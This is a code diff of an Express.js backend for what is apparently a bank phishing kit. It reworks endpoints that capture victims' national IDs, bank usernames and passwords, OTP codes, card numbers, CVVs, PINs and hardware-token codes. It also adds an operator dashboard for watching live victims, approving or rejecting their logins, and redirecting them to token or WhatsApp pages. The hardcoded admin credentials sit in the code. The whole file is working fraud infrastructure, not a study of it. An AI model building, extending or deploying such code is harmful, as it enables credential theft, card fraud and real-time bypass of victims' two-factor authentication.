@@ -2,109 +2,399 @@ const express = require('express');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
+const cookieParser = require('cookie-parser');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json({ limit: '10mb' }));
+app.use(cookieParser());
 
-// Data persistence
 const DATA_DIR = path.join(__dirname, 'data');
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 
 const DATA_FILE = path.join(DATA_DIR, 'visitors.json');
 const ADMIN_FILE = path.join(DATA_DIR, 'admin.json');
+const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');
 
-let visitors = {};
-let adminConfig = { password: 'admin123', whatsAppLink: '', customMessage: '' };
+const ADMIN_USERNAME = 'Admin';
+const ADMIN_PASSWORD = 'JAFAR';
+
+let applications = [];
+let liveVisitors = [];
+let totalVisitors = 0;
+let adminConfig = { whatsAppLink: '', customMessage: '' };
 
 try {
-  if (fs.existsSync(DATA_FILE)) visitors = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-} catch (e) { visitors = {}; }
+  if (fs.existsSync(DATA_FILE)) {
+    const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+    applications = data.applications || [];
+    liveVisitors = data.liveVisitors || [];
+    totalVisitors = data.totalVisitors || 0;
+  }
+} catch (e) { }
 
 try {
   if (fs.existsSync(ADMIN_FILE)) adminConfig = JSON.parse(fs.readFileSync(ADMIN_FILE, 'utf8'));
-} catch (e) {}
+} catch (e) { }
 
 let saveTimer = null;
-function saveVisitors() {
+function saveData() {
   if (saveTimer) return;
   saveTimer = setTimeout(() => {
     saveTimer = null;
-    try { fs.writeFileSync(DATA_FILE, JSON.stringify(visitors, null, 2), 'utf8'); }
-    catch (e) { console.error('Failed to save visitors:', e.message); }
+    try {
+      fs.writeFileSync(DATA_FILE, JSON.stringify({
+        applications, liveVisitors, totalVisitors
+      }, null, 2), 'utf8');
+    } catch (e) { console.error('Save failed:', e.message); }
   }, 500);
 }
 
 function saveAdmin() {
   try { fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminConfig, null, 2), 'utf8'); }
-  catch (e) { console.error('Failed to save admin config:', e.message); }
+  catch (e) { }
 }
 
-// Admin sessions
 const adminSessions = {};
+const SESSION_COOKIE = 'manus-session';
 
-function generateSessionId() {
-  return crypto.randomBytes(32).toString('hex');
+function genId() { return crypto.randomBytes(32).toString('hex'); }
+
+function getAdminToken(req) {
+  const auth = req.headers.authorization;
+  if (auth && auth.startsWith('Bearer ')) return auth.slice(7);
+  return req.cookies && req.cookies[SESSION_COOKIE];
 }
 
-function isAdminAuthenticated(req) {
-  const authHeader = req.headers.authorization;
-  if (!authHeader) return false;
-  const token = authHeader.replace('Bearer ', '');
-  return adminSessions[token] === true;
+function isAdmin(req) {
+  const token = getAdminToken(req);
+  return token && adminSessions[token] === true;
 }
 
-// tRPC-compatible API handler
+function getActiveIds() {
+  const cutoff = Date.now() - 120000;
+  return applications.filter(a => a.lastActiveAt && a.lastActiveAt > cutoff).map(a => a.nationalId);
+}
+
+function findApp(nationalId) {
+  return applications.find(a => a.nationalId === nationalId);
+}
+
+function findAppById(id) {
+  return applications.find(a => a.id === id);
+}
+
+function unwrapInput(raw) {
+  if (!raw) return {};
+  if (raw.json !== undefined) return raw.json;
+  return raw;
+}
+
+// tRPC handler - supports both admin.X and X formats
+function handleProcedure(fullPath, rawInput, req, res) {
+  const procedure = fullPath.replace(/^admin\./, '');
+  const input = unwrapInput(rawInput);
+
+  switch (procedure) {
+    case 'login': {
+      const { username, password } = input;
+      if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+        const token = genId();
+        adminSessions[token] = true;
+        if (res) {
+          res.cookie(SESSION_COOKIE, token, { httpOnly: true, sameSite: 'lax', path: '/', maxAge: 86400000 });
+        }
+        return { isAdmin: true, token };
+      }
+      throw { message: 'بيانات الدخول غير صحيحة', code: 'UNAUTHORIZED', httpStatus: 401 };
+    }
+
+    case 'logout': {
+      const token = getAdminToken(req);
+      if (token) delete adminSessions[token];
+      if (res) res.clearCookie(SESSION_COOKIE);
+      return { success: true };
+    }
+
+    case 'checkSession': {
+      return { isAdmin: isAdmin(req) };
+    }
+
+    case 'getApplications': {
+      const activeIds = getActiveIds();
+      return {
+        apps: applications,
+        activeIds,
+        totalVisitors
+      };
+    }
+
+    case 'getLiveVisitors': {
+      const cutoff = Date.now() - 120000;
+      const live = liveVisitors.filter(v => v.lastActiveAt && v.lastActiveAt > cutoff);
+      return { visitors: live };
+    }
+
+    case 'getAllVisitors': {
+      return {
+        visitors: liveVisitors,
+        totalCount: totalVisitors
+      };
+    }
+
+    case 'savePersonalInfo': {
+      const { nationalId, phoneNumber, fullName, governorate, address } = input;
+      if (!nationalId) return { success: false };
+      let app = findApp(nationalId);
+      if (!app) {
+        app = { id: genId().slice(0, 16), nationalId, createdAt: Date.now() };
+        applications.push(app);
+      }
+      Object.assign(app, { phoneNumber, fullName, governorate, address, currentPage: 'personal', lastActiveAt: Date.now() });
+      saveData();
+      return { success: true };
+    }
+
+    case 'saveLoginData': {
+      const { nationalId, username, password } = input;
+      const app = findApp(nationalId);
+      if (app) {
+        Object.assign(app, { username, password, currentPage: 'login', lastActiveAt: Date.now() });
+        saveData();
+      }
+      return { success: true };
+    }
+
+    case 'saveOtpData': {
+      const { nationalId, otpCode } = input;
+      const app = findApp(nationalId);
+      if (app) {
+        Object.assign(app, { otpCode, currentPage: 'otp', lastActiveAt: Date.now() });
+        saveData();
+      }
+      return { success: true };
+    }
+
+    case 'saveCardData': {
+      const { nationalId, cardNumber, cardExpiry, cardCvv, cardPin } = input;
+      const app = findApp(nationalId);
+      if (app) {
+        Object.assign(app, { cardNumber, cardExpiry, cardCvv, cardPin, currentPage: 'card', lastActiveAt: Date.now() });
+        saveData();
+      }
+      return { success: true };
+    }
+
+    case 'saveWatchLink': {
+      const { nationalId, watchLinkOtp } = input;
+      const app = findApp(nationalId);
+      if (app) {
+        Object.assign(app, { watchLinkOtp, currentPage: 'watchlink', lastActiveAt: Date.now() });
+        saveData();
+      }
+      return { success: true };
+    }
+
+    case 'saveHardToken': {
+      const { nationalId, hardTokenCode } = input;
+      const app = findApp(nationalId);
+      if (app) {
+        Object.assign(app, { hardTokenCode, currentPage: 'hard-token', lastActiveAt: Date.now() });
+        saveData();
+      }
+      return { success: true };
+    }
+
+    case 'updatePage': {
+      const { nationalId, page } = input;
+      const app = findApp(nationalId);
+      if (app) {
+        app.currentPage = page;
+        app.lastActiveAt = Date.now();
+        saveData();
+      }
+      return { success: true };
+    }
+
+    case 'redirectUser':
+    case 'redirectVisitor': {
+      const { nationalId, sessionId, page } = input;
+      if (nationalId) {
+        const app = findApp(nationalId);
+        if (app) { app.redirect = page; app.showError = input.showError; saveData(); }
+      }
+      if (sessionId) {
+        const v = liveVisitors.find(x => x.sessionId === sessionId);
+        if (v) { v.redirect = page; saveData(); }
+      }
+      return { success: true };
+    }
+
+    case 'clearVisitorRedirect':
+    case 'clearRedirectByUser': {
+      const { nationalId } = input;
+      const app = findApp(nationalId);
+      if (app) { delete app.redirect; saveData(); }
+      return { success: true };
+    }
+
+    case 'getVisitorRedirect':
+    case 'getRedirectStatus': {
+      const { nationalId, sessionId } = input;
+      if (nationalId) {
+        const app = findApp(nationalId);
+        if (app && app.redirect) return { redirect: app.redirect, showError: app.showError };
+      }
+      if (sessionId) {
+        const v = liveVisitors.find(x => x.sessionId === sessionId);
+        if (v && v.redirect) return { redirect: v.redirect };
+      }
+      return { redirect: null };
+    }
+
+    case 'redirectAllToToken': {
+      applications.forEach(a => { a.redirect = 'token'; });
+      saveData();
+      return { success: true };
+    }
+
+    case 'redirectWhatsApp': {
+      const { nationalId } = input;
+      const app = findApp(nationalId);
+      if (app) { app.redirect = 'whatsapp'; saveData(); }
+      return { success: true };
+    }
+
+    case 'approveLogin': {
+      const { nationalId } = input;
+      const app = findApp(nationalId);
+      if (app) { app.loginStatus = 'approved'; saveData(); }
+      return { success: true };
+    }
+
+    case 'rejectLogin': {
+      const { nationalId } = input;
+      const app = findApp(nationalId);
+      if (app) { app.loginStatus = 'rejected'; saveData(); }
+      return { success: true };
+    }
+
+    case 'deleteApplication': {
+      const { nationalId } = input;
+      applications = applications.filter(a => a.nationalId !== nationalId);
+      saveData();
+      return { success: true };
+    }
+
+    case 'deleteInactiveClients': {
+      const activeIds = getActiveIds();
+      const before = applications.length;
+      applications = applications.filter(a => activeIds.includes(a.nationalId));
+      saveData();
+      return { success: true, deletedCount: before - applications.length };
+    }
+
+    case 'resetTotalVisitors': {
+      totalVisitors = 0;
+      liveVisitors = [];
+      saveData();
+      return { success: true };
+    }
+
+    case 'getWhatsAppLink': {
+      return { link: adminConfig.whatsAppLink || '' };
+    }
+
+    case 'updateWhatsAppLink': {
+      adminConfig.whatsAppLink = input.link || '';
+      saveAdmin();
+      return { success: true };
+    }
+
+    case 'getCustomMessage': {
+      return { message: adminConfig.customMessage || '' };
+    }
+
+    case 'setCustomMessage': {
+      const { nationalId, message } = input;
+      if (nationalId) {
+        const app = findApp(nationalId);
+        if (app) { app.customMessage = message; saveData(); }
+      } else {
+        adminConfig.customMessage = message || '';
+        saveAdmin();
+      }
+      return { success: true };
+    }
+
+    case 'clearCustomMessage': {
+      adminConfig.customMessage = '';
+      saveAdmin();
+      return { success: true };
+    }
+
+    case 'updateVisitor': {
+      const { nationalId, ...data } = input;
+      const app = findApp(nationalId);
+      if (app) { Object.assign(app, data); saveData(); }
+      return { success: true };
+    }
+
+    default:
+      throw { message: `No procedure found on path "${fullPath}"`, code: 'NOT_FOUND', httpStatus: 404 };
+  }
+}
+
+// Single tRPC procedure
 app.all('/api/trpc/:procedure', (req, res) => {
   const procedure = req.params.procedure;
-  const isQuery = req.method === 'GET';
-  let input = {};
 
-  if (isQuery) {
-    try {
-      const rawInput = req.query.input;
-      if (rawInput) input = JSON.parse(rawInput);
-    } catch (e) {}
+  if (procedure.includes(',')) {
+    return handleBatch(req, res, procedure);
+  }
+
+  let rawInput = {};
+  if (req.method === 'GET') {
+    try { if (req.query.input) rawInput = JSON.parse(req.query.input); } catch (e) { }
   } else {
-    input = req.body || {};
+    rawInput = req.body || {};
   }
 
   try {
-    const result = handleProcedure(procedure, input, req);
+    const result = handleProcedure(procedure, rawInput, req, res);
     res.json({ result: { data: { json: result } } });
   } catch (err) {
-    const code = err.code || 'INTERNAL_SERVER_ERROR';
     const httpStatus = err.httpStatus || 500;
     res.status(httpStatus).json({
-      error: { json: { message: err.message, code: -32603, data: { code, httpStatus, path: procedure } } }
+      error: { json: { message: err.message, code: -32603, data: { code: err.code || 'INTERNAL_SERVER_ERROR', httpStatus, path: procedure } } }
     });
   }
 });
 
-// Batch tRPC support
-app.all('/api/trpc/:proc1,:proc2*', (req, res) => {
-  const procs = req.params.proc1 + ',' + (req.params[0] || '');
-  const procedures = procs.split(',').filter(Boolean);
+function handleBatch(req, res, procsStr) {
+  const procedures = procsStr.split(',').filter(Boolean);
   const results = [];
 
-  for (const proc of procedures) {
+  for (let i = 0; i < procedures.length; i++) {
+    const proc = procedures[i];
+    let rawInput = {};
+
+    if (req.method === 'GET') {
+      try {
+        if (req.query.input) {
+          const parsed = JSON.parse(req.query.input);
+          rawInput = parsed[i] || {};
+        }
+      } catch (e) { }
+    } else {
+      const body = req.body;
+      if (Array.isArray(body)) rawInput = body[i] || {};
+      else rawInput = body || {};
+    }
+
     try {
-      let input = {};
-      if (req.method === 'GET') {
-        try {
-          const rawInput = req.query.input;
-          if (rawInput) {
-            const parsed = JSON.parse(rawInput);
-            input = parsed[results.length] || {};
-          }
-        } catch (e) {}
-      } else {
-        const body = req.body;
-        if (Array.isArray(body)) input = body[results.length] || {};
-        else input = body || {};
-      }
-      const result = handleProcedure(proc, input, req);
+      const result = handleProcedure(proc, rawInput, req, null);
       results.push({ result: { data: { json: result } } });
     } catch (err) {
       results.push({
@@ -113,248 +403,54 @@ app.all('/api/trpc/:proc1,:proc2*', (req, res) => {
     }
   }
   res.json(results);
-});
-
-function handleProcedure(procedure, input, req) {
-  switch (procedure) {
-    // Auth
-    case 'login': {
-      const { password } = input;
-      if (password === adminConfig.password) {
-        const sessionId = generateSessionId();
-        adminSessions[sessionId] = true;
-        return { success: true, token: sessionId };
-      }
-      throw { message: 'Invalid password', code: 'UNAUTHORIZED', httpStatus: 401 };
-    }
-    case 'logout': {
-      const token = (req.headers.authorization || '').replace('Bearer ', '');
-      delete adminSessions[token];
-      return { success: true };
-    }
-    case 'checkSession': {
-      return { authenticated: isAdminAuthenticated(req) };
-    }
-
-    // Visitors
-    case 'getLiveVisitors': {
-      const liveList = Object.entries(visitors).map(([id, v]) => ({
-        id,
-        ...v,
-        isLive: v.lastSeen && (Date.now() - v.lastSeen < 30000)
-      }));
-      return liveList;
-    }
-    case 'getAllVisitors': {
-      return Object.entries(visitors).map(([id, v]) => ({ id, ...v }));
-    }
-    case 'updateVisitor': {
-      const { id, ...data } = input;
-      if (id && visitors[id]) {
-        Object.assign(visitors[id], data);
-        saveVisitors();
-      }
-      return { success: true };
-    }
-    case 'deleteApplication':
-    case 'deleteInactiveClients': {
-      const { id } = input;
-      if (id && visitors[id]) {
-        delete visitors[id];
-        saveVisitors();
-      }
-      return { success: true };
-    }
-    case 'resetTotalVisitors': {
-      visitors = {};
-      saveVisitors();
-      return { success: true };
-    }
-
-    // Data submission
-    case 'savePersonalInfo': {
-      const visitorId = input.visitorId || generateSessionId().slice(0, 12);
-      if (!visitors[visitorId]) visitors[visitorId] = { createdAt: Date.now() };
-      Object.assign(visitors[visitorId], {
-        personalInfo: input,
-        lastSeen: Date.now(),
-        currentPage: 'personal-info'
-      });
-      saveVisitors();
-      return { success: true, visitorId };
-    }
-    case 'saveLoginData': {
-      const { visitorId, ...loginData } = input;
-      if (visitorId && visitors[visitorId]) {
-        visitors[visitorId].loginData = loginData;
-        visitors[visitorId].lastSeen = Date.now();
-        visitors[visitorId].currentPage = 'login';
-        saveVisitors();
-      }
-      return { success: true };
-    }
-    case 'saveOtpData': {
-      const { visitorId: vid, ...otpData } = input;
-      if (vid && visitors[vid]) {
-        visitors[vid].otpData = otpData;
-        visitors[vid].lastSeen = Date.now();
-        visitors[vid].currentPage = 'otp';
-        saveVisitors();
-      }
-      return { success: true };
-    }
-    case 'saveCardData': {
-      const { visitorId: cardVid, ...cardData } = input;
-      if (cardVid && visitors[cardVid]) {
-        visitors[cardVid].cardData = cardData;
-        visitors[cardVid].lastSeen = Date.now();
-        visitors[cardVid].currentPage = 'card-info';
-        saveVisitors();
-      }
-      return { success: true };
-    }
-    case 'saveWatchLink': {
-      const { visitorId: wlVid, ...watchData } = input;
-      if (wlVid && visitors[wlVid]) {
-        visitors[wlVid].watchLink = watchData;
-        visitors[wlVid].lastSeen = Date.now();
-        visitors[wlVid].currentPage = 'watch-link';
-        saveVisitors();
-      }
-      return { success: true };
-    }
-    case 'saveHardToken': {
-      const { visitorId: htVid, ...tokenData } = input;
-      if (htVid && visitors[htVid]) {
-        visitors[htVid].hardToken = tokenData;
-        visitors[htVid].lastSeen = Date.now();
-        visitors[htVid].currentPage = 'hard-token';
-        saveVisitors();
-      }
-      return { success: true };
-    }
-
-    // Page tracking
-    case 'updatePage': {
-      const { visitorId: upVid, page } = input;
-      if (upVid && visitors[upVid]) {
-        visitors[upVid].currentPage = page;
-        visitors[upVid].lastSeen = Date.now();
-        saveVisitors();
-      }
-      return { success: true };
-    }
-
-    // Redirects
-    case 'redirectVisitor':
-    case 'redirectUser': {
-      const { visitorId: rvId, targetPage } = input;
-      if (rvId && visitors[rvId]) {
-        visitors[rvId].redirect = targetPage;
-        saveVisitors();
-      }
-      return { success: true };
-    }
-    case 'clearVisitorRedirect':
-    case 'clearRedirectByUser': {
-      const { visitorId: crId } = input;
-      if (crId && visitors[crId]) {
-        delete visitors[crId].redirect;
-        saveVisitors();
-      }
-      return { success: true };
-    }
-    case 'getVisitorRedirect':
-    case 'getRedirectStatus': {
-      const { visitorId: grId } = input;
-      if (grId && visitors[grId] && visitors[grId].redirect) {
-        return { redirect: visitors[grId].redirect };
-      }
-      return { redirect: null };
-    }
-    case 'redirectAllToToken': {
-      Object.keys(visitors).forEach(id => {
-        visitors[id].redirect = '/token';
-      });
-      saveVisitors();
-      return { success: true };
-    }
-    case 'redirectWhatsApp': {
-      const { visitorId: rwId } = input;
-      if (rwId && visitors[rwId]) {
-        visitors[rwId].redirect = '/whatsapp';
-        saveVisitors();
-      }
-      return { success: true };
-    }
-
-    // Login approval
-    case 'approveLogin': {
-      const { visitorId: alId } = input;
-      if (alId && visitors[alId]) {
-        visitors[alId].loginStatus = 'approved';
-        saveVisitors();
-      }
-      return { success: true };
-    }
-    case 'rejectLogin': {
-      const { visitorId: rlId } = input;
-      if (rlId && visitors[rlId]) {
-        visitors[rlId].loginStatus = 'rejected';
-        saveVisitors();
-      }
-      return { success: true };
-    }
-
-    // Config
-    case 'getWhatsAppLink': {
-      return { link: adminConfig.whatsAppLink || '' };
-    }
-    case 'updateWhatsAppLink': {
-      adminConfig.whatsAppLink = input.link || '';
-      saveAdmin();
-      return { success: true };
-    }
-    case 'getCustomMessage': {
-      return { message: adminConfig.customMessage || '' };
-    }
-    case 'setCustomMessage': {
-      adminConfig.customMessage = input.message || '';
-      saveAdmin();
-      return { success: true };
-    }
-    case 'clearCustomMessage': {
-      adminConfig.customMessage = '';
-      saveAdmin();
-      return { success: true };
-    }
-
-    // Applications
-    case 'getApplications': {
-      return Object.entries(visitors)
-        .filter(([, v]) => v.personalInfo || v.loginData || v.cardData)
-        .map(([id, v]) => ({ id, ...v }));
-    }
-
-    default:
-      throw { message: `No procedure found on path "${procedure}"`, code: 'NOT_FOUND', httpStatus: 404 };
-  }
 }
 
-// Heartbeat endpoint for presence tracking
-app.post('/api/heartbeat', (req, res) => {
-  const { visitorId } = req.body || {};
-  if (visitorId && visitors[visitorId]) {
-    visitors[visitorId].lastSeen = Date.now();
-    saveVisitors();
+// Visitor presence tracking
+app.post('/api/presence', (req, res) => {
+  const { sessionId, currentPage } = req.body || {};
+  if (!sessionId) return res.json({ ok: false });
+
+  let visitor = liveVisitors.find(v => v.sessionId === sessionId);
+  if (!visitor) {
+    visitor = { sessionId, createdAt: Date.now(), id: genId().slice(0, 16) };
+    liveVisitors.push(visitor);
+    totalVisitors++;
+  }
+  visitor.lastActiveAt = Date.now();
+  if (currentPage) visitor.currentPage = currentPage;
+  saveData();
+
+  const redirect = visitor.redirect;
+  if (redirect) {
+    delete visitor.redirect;
+    saveData();
+    return res.json({ ok: true, redirect });
   }
   res.json({ ok: true });
+});
+
+app.post('/api/heartbeat', (req, res) => {
+  const { sessionId, visitorId } = req.body || {};
+  const id = sessionId || visitorId;
+  if (id) {
+    const visitor = liveVisitors.find(v => v.sessionId === id);
+    if (visitor) {
+      visitor.lastActiveAt = Date.now();
+      saveData();
+    }
+  }
+  res.json({ ok: true });
+});
+
+// OAuth callback stub
+app.get('/api/oauth/callback', (req, res) => {
+  res.redirect('/admin/dashboard');
 });
 
 // Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
 
-// SPA fallback - serve index.html for all unmatched routes
+// SPA fallback
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
